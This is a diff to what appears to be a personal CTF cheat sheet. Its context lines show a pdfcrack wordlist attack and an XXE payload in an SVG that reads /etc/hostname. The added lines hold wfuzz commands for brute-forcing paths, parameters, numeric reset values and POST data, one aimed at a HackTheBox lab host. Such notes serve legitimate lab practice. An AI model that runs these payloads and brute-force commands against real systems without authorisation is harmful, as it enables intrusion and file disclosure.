@@ -52,3 +52,17 @@ pdfcrack -f locked.pdf -w rockyou.txt
 
 ### xxe in svg
 ```<?xml version="1.0" standalone="yes"?><!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> ```
+
+## Bruteforce/fuzzing
+
+### wfuzz
+
+#### hide 404
+./wfuzz -w wordlist/general/big.txt --hc 404 http://xxxxxxxxzxzx.zxz/FUZZ
+#### parameters
+./wfuzz -w wordlist/general/megabeast.txt --hh 24 http://docker.hackthebox.eu:43658/api/action.php?FUZZ=1
+#### numericals
+./wfuzz -z range,0-10000 --hh 27 http://xxxxxx.xxx/api/action.php?reset=FUZZ
+### data
+./wfuzz -w wordlist/general/big.txt -d "FUZZ=1" http://xxxxx.xxx/api/action.php
+
